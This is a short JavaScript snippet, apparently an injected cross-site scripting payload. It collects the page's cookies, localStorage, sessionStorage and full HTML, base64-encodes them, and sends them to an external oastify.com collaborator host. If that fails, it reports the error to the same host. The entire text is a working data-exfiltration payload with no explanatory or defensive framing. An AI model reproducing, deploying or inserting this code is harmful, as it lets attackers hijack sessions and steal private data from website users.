(function(){
  try {
    let data = {
      cookie: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      html: document.documentElement.innerHTML
    };

    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?d=" + btoa(JSON.stringify(data)))
      .catch(()=>{});
  } catch(e) {
    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?err=" + encodeURIComponent(e.toString()))
      .catch(()=>{});
  }
})();
